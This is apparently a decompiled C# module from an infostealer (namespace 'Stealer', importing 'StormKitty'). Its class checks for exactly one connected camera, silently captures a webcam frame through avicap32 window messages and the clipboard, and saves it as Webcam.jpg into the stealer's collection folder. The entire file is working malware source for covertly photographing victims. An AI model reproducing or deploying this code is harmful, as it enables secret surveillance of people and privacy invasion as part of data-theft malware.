using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using StormKitty;

namespace Stealer
{
	// Token: 0x0200001F RID: 31
	internal sealed class WebcamScreenshot
	{
		// Token: 0x0600009C RID: 156
		[DllImport("avicap32.dll")]
		public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

		// Token: 0x0600009D RID: 157
		[DllImport("user32")]
		public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

		// Token: 0x0600009E RID: 158 RVA: 0x00005F9C File Offset: 0x0000419C
		private static int GetConnectedCamerasCount()
		{
			int num = 0;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						num++;
					}
				}
			}
			catch
			{
				Console.WriteLine("GetConnectedCamerasCount : Query failed");
			}
			return num;
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00006028 File Offset: 0x00004228
		public static bool Make(string sSavePath)
		{
			if (Config.WebcamScreenshot != "1")
			{
				return false;
			}
			if (WebcamScreenshot.GetConnectedCamerasCount() != 1)
			{
				return false;
			}
			try
			{
				Clipboard.Clear();
				WebcamScreenshot.Handle = WebcamScreenshot.capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, 0, 0);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1034U, 0, 0);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1074U, 0, 0);
				Thread.Sleep(WebcamScreenshot.delay);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1084U, 0, 0);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1054U, 0, 0);
				WebcamScreenshot.SendMessage(WebcamScreenshot.Handle, 1035U, 0, 0);
				Image image = (Image)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);
				Clipboard.Clear();
				image.Save(sSavePath + "\\Webcam.jpg", ImageFormat.Jpeg);
				image.Dispose();
				Counter.WebcamScreenshot = true;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				return false;
			}
			return true;
		}

		// Token: 0x04000058 RID: 88
		private static IntPtr Handle;

		// Token: 0x04000059 RID: 89
		private static int delay = 3000;
	}
}
